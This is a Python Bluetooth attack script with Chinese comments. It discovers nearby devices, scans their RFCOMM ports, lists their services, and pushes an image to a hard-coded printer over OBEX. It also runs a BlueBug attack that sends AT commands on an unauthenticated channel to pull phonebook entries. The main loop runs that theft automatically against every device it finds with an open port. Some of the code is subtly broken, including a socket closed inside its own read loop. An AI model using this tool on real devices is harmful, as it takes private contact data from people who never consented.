import bluetooth 
import obexftp 
#pip install setuptools==57.5.0

# setuptools 工具包再58版本后 废弃了 use_2to3 方法
# pip install --upgrade setuptools  # 将 setuptools 更新回去


#安装方法
# 下载 master.zip	
# python setup.py install  https://github.com/pybluez/pybluez/blob/master/docs/install.rst
import time

alreadyFound=[] 
def findDevs():
    foundDevice=bluetooth.discover_devices(lookup_names=True)
    for (addr,name) in foundDevice:
        if addr not in alreadyFound:
            print("[+]found Bluetooth device "+str(name))
            print ("[+]Mac address:"+str(addr)) 
            alreadyFound.append(addr)
# 建立RFCOMM连接
# 如果连接成功，RFCOMM通道开发且处于监听状态
def rfcommCon(addr,port):
    sock=bluetooth.BluetoothSocket(bluetooth. RFCOMM)
    try:
        sock.connect((addr,port))
        print("[+] RFCOMM port "+str(port)+" opened")
        sock.close()
        return True
    except Exception as e:
        print("[-] RFCOMM port "+str(port)+" closed")
    
    return False

# Bluetooth Service Discovery Protocol (SDP)
# 描述和枚举蓝牙配置文件的类型以及设备提供的服务
def dspBrowse(add):
    services=bluetooth.find_service(address=add)
    for service in services:
        name=service['name']
        proto=service["protocol"]
        port =str (service['port'])
        print ("[+] Found "+str(name)+'on '+str(proto)+":"+port)

#攻击 
# RFCOMM端口2 上提供了OBEX对象Push服务，试着向它上传一个图片
# 
# 用ObexFtp 连接到打印机
# 从工作站发送一个图片，
# 文件上传成功后，会打印一副图片；
def obexftpFile():
    try:
        btPrinter=obexftp.client(obexftp.BLUETOOTH)
        btPrinter.connect('00:16:38:DE:AD:11', 2)
        btPrinter.put_file('/tmp/ninja.jpg')
        print('[+] Printed Ninja Image.')
    except:
        print('[-] Failed to print Ninja Image.')

# 1. RFCOMM 信道 17 不需要身份验证便可连接
# 2. 扫描 RFCOMM 打开的信道发现 17 信道
# 3. 连接并且发送 AT 命令 下载电话号
def blueBug(tgtPhone):
    #tgtPhone = 'AA:BB:CC:DD:EE:FF'
    port = 17
    phoneSock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
    phoneSock.connect((tgtPhone, port))
    for contact in range(1, 5):
        atCmd = 'AT+CPBR=' + str(contact) + '\n'
        phoneSock.send(atCmd)
        result = phoneSock.recv(1024)
        print ('[+] ' + str(contact) + ': ' + result)
        phoneSock.close()

while True:
    findDevs()
    time.sleep(5)
    for port in range(1,30):
        for addr in alreadyFound:
            ret=rfcommCon(addr,port)
            if ret:blueBug(addr)
            dspBrowse(addr)